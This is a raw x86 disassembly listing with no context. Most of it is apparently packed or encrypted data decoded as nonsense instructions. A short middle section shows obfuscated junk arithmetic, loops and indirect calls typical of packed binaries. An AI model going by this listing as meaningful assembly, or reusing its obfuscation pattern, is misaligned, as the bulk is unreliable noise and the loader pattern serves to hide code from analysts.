  41a86f:	sbb    esi,edx
  41a871:	das    
  41a872:	(bad)
  41a876:	or     eax,DWORD PTR [ebx]
  41a878:	xor    BYTE PTR [ebp+eiz*8-0x7d7e8b8a],dl
  41a87f:	inc    ebp
  41a880:	imul   edi,DWORD PTR [edx+0x23bc1aa8],0x716d0a77
  41a88a:	inc    esp
  41a88b:	test   eax,0x8908f9ec
  41a890:	imul   edi,DWORD PTR [ebp+esi*1-0x9],0xffffffd3
  41a895:	test   eax,0x6317d0b6
  41a89a:	je     0x41a90b
  41a89c:	add    ecx,ebp
  41a89e:	js     0x41a8d8
  41a8a0:	mov    al,ds:0x8ede8a16
  41a8a5:	out    dx,eax
  41a8a6:	pop    ss
  41a8a7:	sahf   
  41a8a8:	retf   
  41a8a9:	or     BYTE PTR [ebp+0x6f46281e],0xa
  41a8b0:	and    al,0xe5
  41a8b2:	mov    ds:0x8ad370db,al
  41a8b7:	arpl   WORD PTR [edx-0x124f25fb],si
  41a8bd:	lock (bad) 
  41a8c0:	push   edi
  41a8c1:	test   al,0x55
  41a8c3:	sbb    eax,0xc1c37c19
  41a8c8:	(bad)  
  41a8c9:	fnsave [ebp+0x688e7470]
  41a8cf:	cmp    ecx,DWORD PTR [edi+0x2069460a]
  41a8d5:	inc    eax
  41a8d6:	call   0xde52:0xdf8faf3d
  41a8dd:	pop    ecx
  41a8de:	scas   al,BYTE PTR es:[edi]
  41a8df:	imul   eax,DWORD PTR [ecx],0xb3b81c9d
  41a8e5:	cmp    al,0xa9
  41a8e7:	outs   dx,BYTE PTR ds:[esi]
  41a8e8:	fadd   DWORD PTR ds:0xf088ef6e
  41a8ee:	push   eax
  41a8ef:	or     al,0x5
  41a8f1:	adc    DWORD PTR ds:0x6d8524bc,ebx
  41a8f7:	aaa    
  41a8f8:	add    eax,0x4e1930c1
  41a8fd:	pop    ss
  41a8fe:	fild   WORD PTR [ebx]
  41a900:	aaa    
  41a901:	jmp    0xf304:0x472d8254
  41a908:	push   edx
  41a909:	jo     0x41a963
  41a90b:	stc    
  41a90c:	(bad)  
  41a90d:	(bad)  
  41a90e:	mov    ecx,0x3f187277
  41a913:	fsub   DWORD PTR [edx+0x62]
  41a916:	xor    cl,BYTE PTR [ebp-0x53]
  41a919:	push   eax
  41a91a:	iret   
  41a91b:	lds    esi,FWORD PTR [edi+ebp*1+0xb]
  41a91f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a920:	adc    eax,0xc17466ec
  41a925:	stc    
  41a926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a927:	mov    WORD PTR [edi-0x25],es
  41a92a:	or     dh,BYTE PTR [edi-0x68d8d67]
  41a930:	retf   
  41a931:	jl     0x41a8fa
  41a933:	int3   
  41a934:	dec    ebx
  41a935:	popf   
  41a936:	pop    ebp
  41a937:	loope  0x41a901
  41a939:	or     ebx,DWORD PTR [eax-0x72f04488]
  41a93f:	push   0x6b
  41a941:	cmp    eax,0xf49a91f5
  41a946:	aam    0xc7
  41a948:	ja     0x41a995
  41a94a:	sub    DWORD PTR [ebx+0x16],esp
  41a94d:	shr    ebp,1
  41a94f:	cmp    DWORD PTR ds:0xb288e776,eax
  41a955:	int    0x30
  41a957:	or     BYTE PTR [ebx+0x9f2a077],bh
  41a95d:	xchg   edx,eax
  41a95e:	stos   BYTE PTR es:[edi],al
  41a95f:	test   BYTE PTR [eax+0x61],ch
  41a962:	arpl   WORD PTR [edi],dx
  41a964:	xor    dl,BYTE PTR [ebx-0x73fd7ad2]
  41a96a:	aad    0x18
  41a96c:	int3   
  41a96d:	adc    esi,DWORD PTR ds:0x174157dd
  41a973:	int    0x86
  41a975:	into   
  41a976:	fst    QWORD PTR [ebp+esi*1-0xd27b0e]
  41a97d:	loop   0x41a9af
  41a97f:	cmp    eax,0x7f905357
  41a984:	test   DWORD PTR [esi+0x7a9a4006],ecx
  41a98a:	shl    ebp,1
  41a98c:	push   ebp
  41a98d:	lods   eax,DWORD PTR ds:[esi]
  41a98e:	xor    al,0x1c
  41a990:	push   edi
  41a991:	into   
  41a992:	fld    DWORD PTR [ebx-0x6351b5c3]
  41a998:	js     0x41a9f1
  41a99a:	inc    esp
  41a99b:	mov    ecx,0x6da570a8
  41a9a0:	sbb    ebp,DWORD PTR [esi+0x74309523]
  41a9a6:	pop    ebp
  41a9a7:	retf   0xe22c
  41a9aa:	repnz add esp,eax
  41a9ad:	mov    esi,0xf61c2da9
  41a9b2:	dec    ecx
  41a9b3:	div    DWORD PTR [ecx-0x646b8df]
  41a9b9:	inc    ecx
  41a9ba:	int    0x88
  41a9bc:	lods   eax,DWORD PTR ds:[esi]
  41a9bd:	iret   
  41a9be:	in     eax,dx
  41a9bf:	sub    bh,dh
  41a9c1:	sti    
  41a9c2:	mov    bh,0xf9
  41a9c4:	jecxz  0x41a9d4
  41a9c6:	jge    0x41a9a9
  41a9c8:	pop    esp
  41a9c9:	mov    fs,ecx
  41a9cb:	aam    0x24
  41a9cd:	mov    al,ds:0x5d363b83
  41a9d2:	cmc    
  41a9d3:	not    DWORD PTR [edi-0x5b7700a8]
  41a9d9:	int3   
  41a9da:	xchg   BYTE PTR [ecx],al
  41a9dc:	cli    
  41a9dd:	dec    ebx
  41a9de:	out    dx,eax
  41a9df:	jbe    0x41a9a0
  41a9e1:	xchg   esp,eax
  41a9e2:	fwait
  41a9e3:	or     al,0xce
  41a9e5:	sbb    al,0x44
  41a9e7:	push   ecx
  41a9e8:	popa   
  41a9e9:	or     edx,DWORD PTR [edx+0x313b6ade]
  41a9ef:	enter  0x6ebb,0x21
  41a9f3:	dec    edx
  41a9f4:	sub    dl,BYTE PTR [edx-0x10]
  41a9f7:	mov    al,0x64
  41a9f9:	in     eax,dx
  41a9fa:	ins    DWORD PTR es:[edi],dx
  41a9fb:	sar    DWORD PTR [esi-0x34],cl
  41a9fe:	mov    ebp,0x2325dead
  41aa03:	dec    ecx
  41aa04:	and    ebp,eax
  41aa06:	test   DWORD PTR [edx-0x53],0xd688d5bb
  41aa0d:	imul   esp,DWORD PTR [esi],0xf7a34d57
  41aa13:	and    ecx,eax
  41aa15:	mov    ebx,0xc5b99fae
  41aa1a:	xchg   esi,eax
  41aa1b:	repnz rol BYTE PTR ds:0x49529aca,0xec
  41aa23:	sub    esp,DWORD PTR [ecx-0x23]
  41aa26:	inc    edx
  41aa27:	jmp    0x9b21:0x3a1df838
  41aa2e:	cmp    bl,BYTE PTR [eax+0x71]
  41aa31:	mov    dh,0xa1
  41aa33:	mov    al,0xc1
  41aa35:	dec    esi
  41aa36:	cmp    BYTE PTR [edx],ch
  41aa38:	lea    edx,[ecx-0x28]
  41aa3b:	xlat   BYTE PTR ds:[ebx]
  41aa3c:	mov    ebp,0x34869ddb
  41aa41:	adc    al,BYTE PTR [ebx+0x7886a73]
  41aa47:	loope  0x41a9e9
  41aa49:	(bad)  
  41aa4a:	retf   
  41aa4b:	sti    
  41aa4c:	ror    DWORD PTR [edx-0x6704923d],1
  41aa52:	int3   
  41aa53:	push   esi
  41aa54:	sti    
  41aa55:	mov    DWORD PTR [eax-0x6f],esp
  41aa58:	xor    al,0x8a
  41aa5a:	inc    ebx
  41aa5b:	ins    DWORD PTR es:[edi],dx
  41aa5c:	addr16 mov bl,0xda
  41aa5f:	scas   eax,DWORD PTR es:[edi]
  41aa60:	mov    al,0x82
  41aa62:	inc    ebp
  41aa63:	mov    BYTE PTR [edi],bl
  41aa65:	push   DWORD PTR [ecx+0x3d544b21]
  41aa6b:	cwde   
  41aa6c:	int3   
  41aa6d:	stc    
  41aa6e:	mov    esp,0x59176d6
  41aa73:	pushf  
  41aa74:	lea    ebx,[ebx-0x330d5f5f]
  41aa7a:	js     0x41aaab
  41aa7c:	idiv   BYTE PTR [ecx+0x445fc685]
  41aa82:	bound  esp,QWORD PTR [ebx-0x65]
  41aa85:	jl     0x41aaf1
  41aa87:	xchg   ebx,eax
  41aa88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa89:	pop    ss
  41aa8a:	shl    DWORD PTR [edi+0x3b],1
  41aa8d:	loopne 0x41aa85
  41aa8f:	mov    ecx,0xaf72d01d
  41aa94:	inc    ebx
  41aa95:	dec    eax
  41aa96:	push   ebx
  41aa97:	jnp    0x41aa51
  41aa99:	cmp    BYTE PTR [edx+0xb120cad],0x9a
  41aaa0:	mov    ch,dh
  41aaa2:	js     0x41aa4a
  41aaa4:	mov    cl,0x7a
  41aaa6:	xor    eax,0x6b61d933
  41aaab:	retf   
  41aaac:	and    DWORD PTR [ebx+eax*8],esp
  41aaaf:	xchg   BYTE PTR [eax+0x5d],cl
  41aab2:	ret    0x2a7a
  41aab5:	aad    0xd4
  41aab7:	(bad)  
  41aab8:	popf   
  41aab9:	mov    WORD PTR [ebx],?
  41aabb:	fisub  WORD PTR [ebp+0x21b38021]
  41aac1:	or     esi,DWORD PTR [ecx]
  41aac3:	or     bh,BYTE PTR [esi-0x67]
  41aac6:	jmp    0xba84:0x5bf757a5
  41aacd:	test   DWORD PTR [esi],ecx
  41aacf:	ds push ebp
  41aad1:	in     al,dx
  41aad2:	jne    0x41aab2
  41aad4:	fst    st(1)
  41aad6:	in     al,0xae
  41aad8:	sub    bl,0x27
  41aadb:	xchg   ebp,eax
  41aadc:	xor    eax,0x789452f7
  41aae1:	dec    ebx
  41aae2:	es jl  0x41aaaa
  41aae5:	aad    0xf8
  41aae7:	popa   
  41aae8:	(bad)  
  41aae9:	stc    
  41aaea:	and    bl,dl
  41aaec:	pop    es
  41aaed:	mov    cl,BYTE PTR [ecx]
  41aaef:	ss push ebx
  41aaf1:	nop
  41aaf2:	jle    0x41ab2e
  41aaf4:	loop   0x41aadf
  41aaf6:	test   eax,0x59458003
  41aafb:	xchg   ecx,eax
  41aafc:	inc    ebp
  41aafd:	mov    eax,0x5e0f2d8d
  41ab02:	out    0x95,eax
  41ab04:	rcr    DWORD PTR [ebx],1
  41ab06:	pop    ebx
  41ab07:	retf   
  41ab08:	iret   
  41ab09:	adc    eax,0x7f5c2285
  41ab0e:	and    al,0x19
  41ab10:	and    al,bl
  41ab12:	jo     0x41ab39
  41ab14:	or     eax,0x3a2e6acd
  41ab19:	aaa    
  41ab1a:	and    ebx,edx
  41ab1c:	jmp    0x41ab1a
  41ab1e:	mov    ds:0x5117998f,eax
  41ab23:	cmp    ah,BYTE PTR [eax+0x1a88cea]
  41ab29:	mov    ebp,0x509258a3
  41ab2e:	add    ecx,ebp
  41ab30:	xchg   BYTE PTR [edi+0x0],dh
  41ab33:	dec    eax
  41ab34:	sbb    bh,BYTE PTR [ebx-0x3c5a7ada]
  41ab3a:	hlt    
  41ab3b:	(bad)  
  41ab3c:	sbb    BYTE PTR [eax+esi*8-0x6],dh
  41ab40:	icebp  
  41ab41:	and    eax,0x15146b2b
  41ab46:	and    cl,BYTE PTR [ecx+0x18]
  41ab49:	inc    ebx
  41ab4a:	xor    al,0x68
  41ab4c:	shl    edx,cl
  41ab4e:	out    0xd6,eax
  41ab50:	and    bh,BYTE PTR [edx-0x75]
  41ab53:	lods   al,BYTE PTR ds:[esi]
  41ab54:	add    DWORD PTR [esi+0x2833b89c],ebx
  41ab5a:	inc    ebp
  41ab5b:	bound  edi,QWORD PTR [edi-0x52996850]
  41ab61:	scas   eax,DWORD PTR es:[edi]
  41ab62:	stc    
  41ab63:	aam    0x29
  41ab65:	loop   0x41abe4
  41ab67:	shl    BYTE PTR ds:0xd1b0cb3,0xee
  41ab6e:	and    al,0x3d
  41ab70:	aad    0x34
  41ab72:	fsubr  st(2),st
  41ab74:	daa    
  41ab75:	outs   dx,DWORD PTR ds:[esi]
  41ab76:	dec    eax
  41ab77:	pop    ecx
  41ab78:	imul   esp,DWORD PTR [ebp-0x71],0x20
  41ab7c:	lods   al,BYTE PTR ds:[esi]
  41ab7d:	adc    BYTE PTR [ebx+0x7e],0xfd
  41ab81:	mov    edi,0xc312df51
  41ab86:	(bad)  
  41ab87:	jb     0x41ab88
  41ab89:	dec    edi
  41ab8a:	fmul   QWORD PTR [ecx]
  41ab8c:	mov    esp,0xf5cc9456
  41ab91:	mov    ebx,0x68937220
  41ab96:	jge    0x41ab84
  41ab98:	xchg   edi,eax
  41ab99:	out    0x5a,al
  41ab9b:	loope  0x41abb3
  41ab9d:	push   ds
  41ab9e:	(bad)  
  41ab9f:	stos   DWORD PTR es:[edi],eax
  41aba0:	mov    ebx,0x6de01362
  41aba5:	jne    0x41ab3c
  41aba7:	xor    ecx,eax
  41aba9:	jnp    0x41ab50
  41abab:	mov    ebx,0x7eaa3f9
  41abb0:	in     eax,0x30
  41abb2:	push   edi
  41abb3:	ret    
  41abb4:	cmp    al,0xd2
  41abb6:	sub    esi,eax
  41abb8:	fisubr WORD PTR [esi+0x51]
  41abbb:	not    BYTE PTR [ebp-0x303d2415]
  41abc1:	(bad)
  41abc4:	dec    edx
  41abc5:	push   ds
  41abc6:	out    dx,eax
  41abc7:	addr16 push edi
  41abc9:	cs push ss
  41abcb:	pop    eax
  41abcc:	xchg   esi,eax
  41abcd:	and    eax,0x79d596ee
  41abd2:	cld    
  41abd3:	and    ecx,DWORD PTR [edx-0x55]
  41abd6:	cwde   
  41abd7:	loopne 0x41ab94
  41abd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abda:	rcr    BYTE PTR [eax+0x16b05a08],1
  41abe0:	cmp    cl,BYTE PTR [edi+0x7d]
  41abe3:	inc    esp
  41abe4:	mov    ecx,0xfacf90d4
  41abe9:	imul   edi,DWORD PTR [ecx+0x7abdeb4f],0x55
  41abf0:	mov    dl,0x4b
  41abf2:	pop    ds
  41abf3:	jmp    0x41ac26
  41abf5:	mov    esi,0x312c9be0
  41abfa:	adc    esp,DWORD PTR [ecx+0x3b]
  41abfd:	pop    ecx
  41abfe:	mov    esp,0xe6a0e60b
  41ac03:	fcmovbe st,st(0)
  41ac05:	jnp    0x41ac16
  41ac07:	dec    eax
  41ac08:	(bad)  
  41ac09:	lock xor esi,edx
  41ac0c:	mov    cs,WORD PTR [eax-0x66c5a7f]
  41ac12:	ds fwait
  41ac14:	jl     0x41ac0b
  41ac16:	lahf   
  41ac17:	dec    ebp
  41ac18:	jle    0x41abe8
  41ac1a:	sbb    DWORD PTR [edx+0x10],esi
  41ac1d:	enter  0x31e6,0x92
  41ac21:	xor    DWORD PTR [edi-0x5ef8e7c8],ebp
  41ac27:	stos   BYTE PTR es:[edi],al
  41ac28:	sbb    al,0x9b
  41ac2a:	and    al,0x9f
  41ac2c:	mov    ds:0xc252f293,al
  41ac31:	das    
  41ac32:	push   eax
  41ac33:	jmp    0x41abbc
  41ac35:	(bad)
  41ac38:	test   BYTE PTR [edi+0x1d030d8b],cl
  41ac3e:	shl    BYTE PTR [ebx-0xf853655],1
  41ac44:	adc    dh,ch
  41ac46:	and    al,0x6d
  41ac48:	loop   0x41ac13
  41ac4a:	inc    eax
  41ac4b:	lock mov eax,0x5d3a5e7f
  41ac51:	leave  
  41ac52:	pop    edx
  41ac53:	imul   ebx,DWORD PTR [edi+ebx*8-0x2c],0xfffffffd
  41ac58:	and    esp,DWORD PTR [esi-0x37697e6f]
  41ac5e:	push   edx
  41ac5f:	shl    BYTE PTR [esi+0xd5d6d0f],1
  41ac65:	mov    esi,0x715a9c67
  41ac6a:	retf   0x13ec
  41ac6d:	loop   0x41ac13
  41ac6f:	gs gs mov edi,esp
  41ac73:	jno    0x41ac38
  41ac75:	icebp  
  41ac76:	mov    BYTE PTR [edx+0x15],dl
  41ac79:	sti    
  41ac7a:	scas   eax,DWORD PTR es:[edi]
  41ac7b:	inc    ebp
  41ac7c:	mov    bh,0x15
  41ac7e:	scas   eax,DWORD PTR es:[edi]
  41ac7f:	mov    ebx,DWORD PTR [edi-0x3bf5f83b]
  41ac85:	or     ebx,DWORD PTR [ebx-0x4f52e72f]
  41ac8b:	test   BYTE PTR [ebp+esi*4-0x7d36098f],dl
  41ac92:	sub    esp,DWORD PTR [edi]
  41ac94:	hlt    
  41ac95:	dec    ecx
  41ac96:	sbb    edi,DWORD PTR [edx+0x43]
  41ac99:	push   eax
  41ac9a:	(bad)  
  41ac9b:	pop    esi
  41ac9c:	mov    bh,0xee
  41ac9e:	test   BYTE PTR [ecx+0x21],ah
  41aca1:	jne    0x41ace7
  41aca3:	lods   eax,DWORD PTR ds:[esi]
  41aca4:	out    dx,eax
  41aca5:	mov    ds,WORD PTR [ebp+0x16973c0b]
  41acab:	pop    ds
  41acac:	enter  0x88a7,0x2
  41acb0:	iret   
  41acb1:	and    al,0x10
  41acb3:	push   edi
  41acb4:	stc    
  41acb5:	xchg   edi,eax
  41acb6:	mov    ds:0x69195f22,al
  41acbb:	fs mov ch,0xe2
  41acbe:	xor    BYTE PTR [edi-0x1ac1499c],cl
  41acc4:	inc    esi
  41acc5:	cld    
  41acc6:	xlat   BYTE PTR ds:[ebx]
  41acc7:	bound  esp,QWORD PTR [edx-0x46]
  41acca:	aam    0x41
  41accc:	stos   DWORD PTR es:[edi],eax
  41accd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acce:	imul   ebx,DWORD PTR [edi+eiz*4],0xfeedd672
  41acd5:	mov    bl,0x15
  41acd7:	sub    dl,BYTE PTR [ebx+0x32]
  41acda:	aam    0x26
  41acdc:	sbb    BYTE PTR [edx+eax*8-0x72],bl
  41ace0:	cwde   
  41ace1:	mov    esp,edi
  41ace3:	cmp    al,0x5
  41ace5:	sub    ah,BYTE PTR [edi-0x1]
  41ace8:	out    0xe8,eax
  41acea:	imul   esi,DWORD PTR [ebx+edx*8+0x67],0xc037fe7
  41acf2:	ja     0x41ad59
  41acf4:	loopne 0x41ad0e
  41acf6:	loope  0x41ad29
  41acf8:	and    bh,BYTE PTR [ecx]
  41acfa:	clc    
  41acfb:	ficom  DWORD PTR [eax]
  41acfd:	add    dh,ch
  41acff:	clc    
  41ad00:	mov    dh,0x7e
  41ad02:	loope  0x41ace3
  41ad04:	imul   ecx,esi,0x13
  41ad07:	sbb    eax,0x9985858
  41ad0c:	mov    ah,0x12
  41ad0e:	jg     0x41ad1c
  41ad10:	out    0x76,eax
  41ad12:	call   0xa449:0x5f892510
  41ad19:	js     0x41acb2
  41ad1b:	int3   
  41ad1c:	shl    DWORD PTR [ebp-0x50],cl
  41ad1f:	ret    0x61ed
  41ad22:	pop    ecx
  41ad23:	jae    0x41ad21
  41ad25:	push   0xffffffd1
  41ad27:	loope  0x41acf0
  41ad29:	jo     0x41ad8a
  41ad2b:	sahf   
  41ad2c:	gs ror bl,cl
  41ad2f:	cmc    
  41ad30:	xor    al,0xbd
  41ad32:	add    DWORD PTR [edi+0x33c7c5bd],eax
  41ad38:	stos   BYTE PTR es:[edi],al
  41ad39:	test   DWORD PTR [edx+esi*2],ebp
  41ad3c:	cli    
  41ad3d:	shr    DWORD PTR [ebx+0x13],1
  41ad40:	pop    ebp
  41ad41:	in     eax,dx
  41ad42:	xor    BYTE PTR [ecx],dl
  41ad44:	xlat   BYTE PTR ds:[ebx]
  41ad45:	imul   BYTE PTR [ecx-0x54]
  41ad48:	sti    
  41ad49:	push   edi
  41ad4a:	scas   al,BYTE PTR es:[edi]
  41ad4b:	pop    esi
  41ad4c:	and    BYTE PTR [ecx-0x52],0xce
  41ad50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad51:	sub    dh,cl
  41ad53:	push   cs
  41ad54:	add    cl,BYTE PTR [ecx-0xd6da40f]
  41ad5a:	and    DWORD PTR [ebx],ebp
  41ad5c:	inc    ecx
  41ad5d:	popf   
  41ad5e:	inc    esp
  41ad5f:	rol    DWORD PTR [ebp-0x61e56e97],0x54
  41ad66:	adc    BYTE PTR [esi-0x51],ch
  41ad69:	call   0x82d9ed85
  41ad6e:	add    DWORD PTR [esi-0x28],ebp
  41ad71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad72:	mov    ah,0xd2
  41ad74:	sub    eax,0xc4aa3e12
  41ad79:	cmp    DWORD PTR [ebp-0x6f0b78db],ebx
  41ad7f:	call   0xe5c9:0x46a16ada
  41ad86:	inc    ebx
  41ad87:	stos   BYTE PTR es:[edi],al
  41ad88:	and    DWORD PTR [ebx+0x68],ebx
  41ad8b:	out    0x84,eax
  41ad8d:	inc    eax
  41ad8e:	jmp    0x41adc3
  41ad90:	fld    TBYTE PTR [edx]
  41ad92:	pop    ss
  41ad93:	add    ecx,DWORD PTR [eax]
  41ad95:	daa    
  41ad96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad97:	ja     0x41adfc
  41ad99:	shr    DWORD PTR ds:0xc6969562,0xf8
  41ada0:	sahf   
  41ada1:	dec    edi
  41ada2:	inc    esp
  41ada3:	sub    eax,0xf4a15e03
  41ada8:	or     eax,0xf1f469b6
  41adad:	(bad)  
  41adae:	stc    
  41adaf:	fld    QWORD PTR [ebp-0xc4a5b97]
  41adb5:	cmp    eax,0xeb847c49
  41adba:	arpl   WORD PTR [edx-0xb],sp
  41adbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adbe:	sub    bl,BYTE PTR [esi+0x7a]
  41adc1:	sbb    BYTE PTR [esi-0x1c],dh
  41adc4:	lds    esi,FWORD PTR [edx+0x472104f]
  41adca:	lods   al,BYTE PTR ds:[esi]
  41adcb:	mov    edi,0x199c9f24
  41add0:	in     eax,0x37
  41add2:	loop   0x41ae53
  41add4:	pop    edi
  41add5:	test   al,0xe8
  41add7:	dec    eax
  41add8:	jge    0x41ad7b
  41adda:	shl    DWORD PTR [edi-0x6d],cl
  41addd:	mov    ebp,0xb1b844ba
  41ade2:	dec    edi
  41ade3:	adc    BYTE PTR es:[ebx],0xfb
  41ade7:	stc    
  41ade8:	cmp    al,0x81
  41adea:	pusha  
  41adeb:	in     al,dx
  41adec:	add    BYTE PTR [ecx+0x26],dl
  41adef:	or     eax,0xf1971454
  41adf4:	scas   eax,DWORD PTR es:[edi]
  41adf5:	jmp    0xc118:0xab9448a4
  41adfc:	jb     0x41ada6
  41adfe:	in     al,dx
  41adff:	inc    ebx
  41ae00:	lea    ecx,[esi+0x4668262b]
  41ae06:	in     eax,dx
  41ae07:	xchg   esp,eax
  41ae08:	sahf   
  41ae09:	shl    DWORD PTR [ecx+eiz*8-0x1c],cl
  41ae0d:	or     dh,BYTE PTR ds:0x9f2093cc
  41ae13:	in     eax,dx
  41ae14:	cmp    esi,DWORD PTR [esi]
  41ae16:	mov    esi,0xbb4abfd3
  41ae1b:	cwde   
  41ae1c:	sbb    al,0xe3
  41ae1e:	xchg   esi,eax
  41ae1f:	add    cl,BYTE PTR [eax+0x5f076c01]
  41ae25:	or     DWORD PTR [ebp-0x54c7f912],esp
  41ae2b:	cs jge 0x41ae6b
  41ae2e:	iret   
  41ae2f:	push   eax
  41ae30:	xor    BYTE PTR [edi-0x12],cl
  41ae33:	push   0x7
  41ae35:	inc    eax
  41ae36:	aas    
  41ae37:	or     ecx,DWORD PTR [ebx+0x43]
  41ae3a:	out    dx,al
  41ae3b:	ja     0x41ae46
  41ae3d:	or     DWORD PTR [ecx-0x6a],esi
  41ae40:	fbstp  TBYTE PTR [eax]
  41ae42:	test   BYTE PTR [edi+0x5c],bl
  41ae45:	push   ds
  41ae46:	rcl    DWORD PTR [esi+0x41],0xa3
  41ae4a:	mov    ?,WORD PTR [eax+0x56595748]
  41ae50:	cmc    
  41ae51:	in     eax,dx
  41ae52:	and    al,0x83
  41ae54:	inc    eax
  41ae55:	mov    ebx,0x50892107
  41ae5a:	mov    edi,0x8e32a386
  41ae5f:	int3   
  41ae60:	sub    BYTE PTR [edi],0x11
  41ae63:	mov    esp,0xc6cac648
  41ae68:	stos   DWORD PTR es:[edi],eax
  41ae69:	imul   ecx,esp,0xffffffd5
  41ae6c:	add    esi,DWORD PTR [eax-0x42]
  41ae6f:	mov    bl,0xfe
  41ae71:	cmp    DWORD PTR [edx+0x2d25dc82],esi
  41ae77:	sbb    DWORD PTR [ebp+0x71f6ccb9],esi
  41ae7d:	adc    DWORD PTR [eax-0x75c47834],ecx
  41ae83:	pop    esp
  41ae84:	fwait
  41ae85:	idiv   BYTE PTR [esi+0xd]
  41ae88:	das    
  41ae89:	pop    edx
  41ae8a:	cmp    al,0x3d
  41ae8c:	pop    ss
  41ae8d:	and    eax,0x8eb173b5
  41ae92:	push   eax
  41ae93:	push   0x77
  41ae95:	add    ch,BYTE PTR [eax]
  41ae97:	call   0x6262:0xdde51e4d
  41ae9e:	add    esp,DWORD PTR [ebp-0x41]
  41aea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aea2:	dec    ebp
  41aea3:	sub    DWORD PTR [ebx],ebx
  41aea5:	pop    eax
  41aea6:	sub    eax,0xc18ad68e
  41aeab:	push   esp
  41aeac:	bound  edi,QWORD PTR [edx]
  41aeae:	inc    edi
  41aeaf:	push   esi
  41aeb0:	mov    edx,DWORD PTR [ebp+0x8]
  41aeb3:	sub    DWORD PTR ds:0x42a292,edx
  41aeb9:	mov    ebx,DWORD PTR [ebp-0x58]
  41aebc:	sub    DWORD PTR ds:0x42a2c2,0x2e82
  41aec6:	add    edx,0x5708fa
  41aecc:	imul   edx,ebx
  41aecf:	sbb    ebx,0x1e47
  41aed5:	mov    DWORD PTR [ebp-0x58],edx
  41aed8:	or     DWORD PTR ds:0x42a29e,0x157
  41aee2:	mov    edx,DWORD PTR [ebp+0x8]
  41aee5:	sub    ebx,DWORD PTR ds:0x42a2f2
  41aeeb:	mov    ebx,DWORD PTR [ebp-0x54]
  41aeee:	add    edx,0x64f898
  41aef4:	or     DWORD PTR ds:0x42a25a,0x5c58
  41aefe:	or     edx,ebx
  41af00:	mov    ebx,DWORD PTR ds:0x42a322
  41af06:	mov    ebx,DWORD PTR [ebx]
  41af08:	sbb    DWORD PTR ds:0x42a2ee,ebx
  41af0e:	mov    DWORD PTR [ebp-0x54],edx
  41af11:	movzx  edx,WORD PTR ds:0x42a2c2
  41af18:	sub    DWORD PTR ds:0x42a28e,edx
  41af1e:	mov    edx,DWORD PTR [ebp+0x8]
  41af21:	xor    ebx,DWORD PTR ds:0x42a28a
  41af27:	mov    ebx,DWORD PTR [ebp-0x50]
  41af2a:	adc    DWORD PTR ds:0x42a29a,0x42a2a6
  41af34:	add    edx,ecx
  41af36:	sbb    DWORD PTR ds:0x42a2f2,0x42a2de
  41af40:	xor    edx,ebx
  41af42:	or     DWORD PTR ds:0x42a2de,edx
  41af48:	mov    DWORD PTR [ebp-0x50],edx
  41af4b:	and    DWORD PTR ds:0x42a262,0x0
  41af55:	xor    edx,edx
  41af57:	xor    edx,DWORD PTR ds:0x42a262
  41af5d:	inc    edx
  41af5e:	mov    DWORD PTR ds:0x42a262,edx
  41af64:	cmp    DWORD PTR ds:0x42a262,0x5
  41af6b:	jbe    0x41afb0
  41af71:	jmp    0x41af87
  41af76:	push   0x1fcb
  41af7b:	push   DWORD PTR [ebp-0x28]
  41af7e:	push   DWORD PTR [ebp-0x24]
  41af81:	call   DWORD PTR ds:0x42a402
  41af87:	cmp    DWORD PTR ds:0x42a262,0x4
  41af8e:	jne    0x41afa3
  41af94:	xor    edx,edx
  41af96:	or     edx,DWORD PTR ds:0x42a262
  41af9c:	inc    edx
  41af9d:	mov    DWORD PTR ds:0x42a262,edx
  41afa3:	cmp    DWORD PTR ds:0x42a262,0x16
  41afaa:	jb     0x41af55
  41afb0:	mov    edx,DWORD PTR [ebp+0x8]
  41afb3:	and    DWORD PTR ds:0x42a2f2,0x0
  41afbd:	xor    ebx,ebx
  41afbf:	or     ebx,DWORD PTR ds:0x42a2f2
  41afc5:	inc    ebx
  41afc6:	mov    DWORD PTR ds:0x42a2f2,ebx
  41afcc:	cmp    DWORD PTR ds:0x42a2f2,0xb
  41afd3:	jl     0x41b024
  41afd9:	jmp    0x41affd
  41afde:	push   0x1
  41afe0:	push   DWORD PTR [ebp-0x10]
  41afe3:	push   0x5b88
  41afe8:	push   0x81d2
  41afed:	push   0x4421
  41aff2:	push   0x50f5
  41aff7:	call   DWORD PTR ds:0x42a3c2
  41affd:	cmp    DWORD PTR ds:0x42a2f2,0xa
  41b004:	jne    0x41b017
  41b00a:	mov    ebx,DWORD PTR ds:0x42a2f2
  41b010:	inc    ebx
  41b011:	mov    DWORD PTR ds:0x42a2f2,ebx
  41b017:	cmp    DWORD PTR ds:0x42a2f2,0x18
  41b01e:	jb     0x41afbd
  41b024:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b027:	adc    DWORD PTR ds:0x42a2f6,0x42a2e2
  41b031:	jmp    0x41d389
  41b036:	xchg   ebx,eax
  41b037:	jmp    0xab5b1b75
  41b03c:	add    DWORD PTR [ecx+0x1dcb2f48],0x1e5e29d4
  41b046:	mov    bh,bh
  41b048:	jl     0x41afcd
  41b04a:	inc    esi
  41b04b:	pop    esi
  41b04c:	add    DWORD PTR [ebx+0x3d61e1e5],0xffffffc0
  41b053:	jecxz  0x41b0b9
  41b055:	sub    bh,BYTE PTR [edi+eax*4+0x5c08bed4]
  41b05c:	test   DWORD PTR [ebx],0xd2b41929
  41b062:	lock push cs
  41b064:	das    
  41b065:	add    dh,BYTE PTR [esi-0x6d]
  41b068:	shl    bl,1
  41b06a:	cdq    
  41b06b:	mov    ebx,0x76523035
  41b070:	pop    ecx
  41b071:	mov    ds:0x3e7daa1f,al
  41b076:	inc    edi
  41b077:	or     al,cl
  41b079:	inc    ebx
  41b07a:	push   ss
  41b07b:	aad    0x62
  41b07d:	cmp    ebp,eax
  41b07f:	sbb    al,0xfe
  41b081:	mov    ebp,0xeed4cb94
  41b086:	outs   dx,DWORD PTR ds:[esi]
  41b087:	in     al,dx
